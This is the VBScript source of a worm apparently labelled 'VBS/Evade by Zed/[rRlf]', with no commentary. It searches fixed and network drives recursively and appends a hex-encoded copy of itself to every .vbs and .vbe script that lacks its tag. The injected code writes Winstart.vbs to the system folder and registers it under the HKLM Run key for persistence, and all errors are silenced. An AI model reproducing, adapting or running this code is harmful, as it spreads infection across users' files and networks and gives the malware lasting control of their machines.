
SeekDrives()
Sub SeekDrives()
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
For Each NetDrive In fso.Drives
If NetDrive.DriveType = 2 _
Or NetDrive.DriveType = 3 Then
If NetDrive.IsReady Then
SeekFolders (NetDrive.Path & "\")
End If
End If
Next
End Sub
Sub VBSAppend(VBSFind)
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
For Each n In fso.GetFolder(VBSFind).Files
FileExt = LCase(fso.GetExtensionName(n.Path))
If FileExt = "vbs" Or FileExt = "vbe" Then
Set C6 = fso.OpenTextFile(n.Path, 1)
C7 = C6.ReadAll
C6.Close
WormTag = "' VBS/Evade by Zed/[rRlf]"
If InStr(1, C7, WormTag) = False Then
Set C8 = fso.OpenTextFile(WScript.ScriptFullName, 1)
C1 = C8.ReadAll
C8.Close
Set C0 = fso.OpenTextFile(n.Path, 8, True)
C0.WriteLine vbCrLf & WormTag & vbCrLf & "C3 = " & Chr(34) & Chr(34)
For C4 = 1 To Len(C1)
C3 = Mid(C1, C4, 1)
C3 = Hex(Asc(C3))
If Len(C3) = 1 Then
C3 = "0" & C3
End If
C5 = C5 + C3
If Len(C5) = 110 Then
C0.WriteLine "C3 = C3 + """ + C5 + Chr(34)
C5 = ""
End If
If Len(C1) - C4 = 0 Then
C0.WriteLine "C3 = C3 + """ + C5 + Chr(34)
C5 = ""
End If
Next
C0.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
C0.WriteLine "Set wsc = CreateObject(""WScript.Shell"")"
C0.WriteLine "Set WCL = fso.CreateTextFile(fso.GetSpecialFolder(1) & ""\Winstart.vbs"", True)"
C0.WriteLine "WCL.Write CM(C3)"
C0.WriteLine "WCL.Close"
C0.WriteLine "wsc.RegWrite ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Winstart"", ""Wscript.exe "" & fso.GetSpecialFolder(1) & ""\Winstart.vbs %1"""
C0.WriteLine "Function CM(CN)"
C0.WriteLine "For GC = 1 To Len(CN) Step 2"
C0.WriteLine "CM = CM & Chr(""&h"" & Mid(CN, GC, 2))"
C0.WriteLine "Next"
C0.WriteLine "End Function"
C0.Close
End If
End If
Next
End Sub
Sub SeekFolders(VBSFind)
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
For Each n In fso.GetFolder(VBSFind).SubFolders
VBSAppend (n.Path)
SeekFolders (n.Path)
Next
End Sub
